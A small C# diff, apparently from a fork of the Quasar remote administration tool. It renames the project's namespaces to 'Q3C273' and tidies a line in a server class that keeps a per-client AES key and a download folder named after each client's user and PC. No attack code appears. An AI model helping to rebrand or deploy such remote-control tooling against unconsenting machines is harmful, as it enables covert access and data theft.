@@ -1,9 +1,9 @@
-﻿using Quasar.Common.Cryptography;
-using Quasar.Common.Helpers;
+﻿using Q3C273.Shared.Cryptography;
+using Q3C273.Shared.Helpers;
 using System.IO;
 using System.Windows.Forms;
 
-namespace Quasar.Server.Networking
+namespace Q3C273.Server.Networking
 {
     public class UserState
     {
@@ -26,7 +26,7 @@ namespace Quasar.Server.Networking
 
         public Aes256 AesInstance => _aesInstance ?? (_aesInstance = new Aes256(EncryptionKey));
 
-        public string DownloadDirectory => _downloadDirectory ?? (_downloadDirectory = (!FileHelper.HasIllegalCharacters(UserAtPc))
+        public string DownloadDirectory => _downloadDirectory ?? (_downloadDirectory = !FileHelper.HasIllegalCharacters(UserAtPc)
                                                ? Path.Combine(Application.StartupPath, $"Clients\\{UserAtPc}_{Id.Substring(0, 7)}\\")
                                                : Path.Combine(Application.StartupPath, $"Clients\\{Id}\\"));
     }
